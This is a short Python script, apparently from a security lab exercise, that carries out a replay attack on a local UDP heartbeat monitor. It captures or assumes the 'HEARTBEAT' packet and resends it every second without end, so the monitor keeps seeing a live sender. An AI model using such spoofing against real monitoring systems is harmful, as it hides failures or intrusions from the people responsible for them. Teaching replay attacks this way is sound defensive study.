import socket
import time

monitor_ip = "127.0.0.1"
monitor_port = 9999

# Attack 2 (replay)

beat = b"HEARTBEAT"

capture_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    capture_socket.bind((monitor_ip, monitor_port))
    print("Listening for a real heartbeat to capture...")
    capture_socket.settimeout(10)
    beat, address = capture_socket.recvfrom(1024)
    print("Captured a real heartbeat:", beat)
except OSError:
    print("Port busy (monitor is running) - using the known heartbeat:", beat)
finally:
    capture_socket.close()

# Replay forever.
print("Replaying heartbeat to the monitor (Ctrl-C to stop)...")
replay_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    replay_socket.sendto(beat, (monitor_ip, monitor_port))
    print("Replayed heartbeat")
    time.sleep(1)
